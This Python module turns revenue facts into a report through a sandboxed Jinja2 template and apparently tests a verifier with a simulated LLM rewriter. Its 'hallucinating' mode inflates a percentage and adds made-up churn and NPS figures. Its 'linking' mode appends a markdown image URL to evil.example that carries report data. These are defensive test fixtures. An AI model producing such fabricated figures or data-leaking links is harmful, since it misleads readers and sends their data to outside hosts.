"""Narrative from facts: deterministic Jinja2 template, plus an optional (simulated) writer that must pass verification."""

from __future__ import annotations

from jinja2 import StrictUndefined
from jinja2.sandbox import SandboxedEnvironment

TEMPLATE = """Weekly revenue report for {{ f.period }}.
Revenue was ${{ '{:,}'.format(f.revenue) }}, {{ 'up' if f.revenue_change_pct >= 0 else 'down' }} {{ f.revenue_change_pct|abs }}% from ${{ '{:,}'.format(f.revenue_prev) }} the week before, and {{ f.vs_baseline_pct|abs }}% {{ 'above' if f.vs_baseline_pct >= 0 else 'below' }} the four-week average of ${{ '{:,}'.format(f.baseline_avg) }}.
Orders were {{ '{:,}'.format(f.orders) }} ({{ f.orders_change_pct|abs }}% {{ 'up' if f.orders_change_pct >= 0 else 'down' }}), with an average order value of ${{ f.aov }}.
The largest segment mover was {{ f.top_mover }}, {{ 'up' if f.top_mover_change >= 0 else 'down' }} ${{ '{:,}'.format(f.top_mover_change|abs) }}.
{% if f.anomalies %}Unusual days (z-score of the ratio to the same weekday in the prior four weeks, against the usual spread): {% for d, z in f.anomalies %}{{ d }} ({{ z }}){{ ', ' if not loop.last else '.' }}{% endfor %}
{% else %}No day in the period was unusual against its usual weekday level.
{% endif %}"""


def render(facts: dict) -> str:
    env = SandboxedEnvironment(undefined=StrictUndefined, autoescape=False)
    f = {**facts}

    class Obj(dict):
        __getattr__ = dict.__getitem__

    return env.from_string(TEMPLATE).render(f=Obj(f)).strip()


class SimWriter:
    """SIMULATED LLM rewriter. mode: faithful | hallucinating | linking."""

    def __init__(self, mode: str = "faithful"):
        self.mode = mode

    def rewrite(self, text: str, facts: dict) -> str:
        if self.mode == "faithful":
            return text.replace("Weekly revenue report", "Here is the revenue summary").replace(
                "The largest segment mover was", "Biggest change by segment:"
            )
        if self.mode == "hallucinating":
            wrong = text.replace(
                f"{abs(facts['revenue_change_pct'])}%",
                f"{abs(facts['revenue_change_pct']) + 7}%",
                1,
            )
            return wrong + " Customer churn improved by 14% and NPS reached 61."
        if self.mode == "linking":
            return (
                text
                + " Details: ![chart](https://evil.example/c.png?d=revenue) or see https://evil.example/report"
            )
        raise ValueError(mode_error(self.mode))


def mode_error(m: str) -> str:
    return f"unknown writer mode {m!r}"
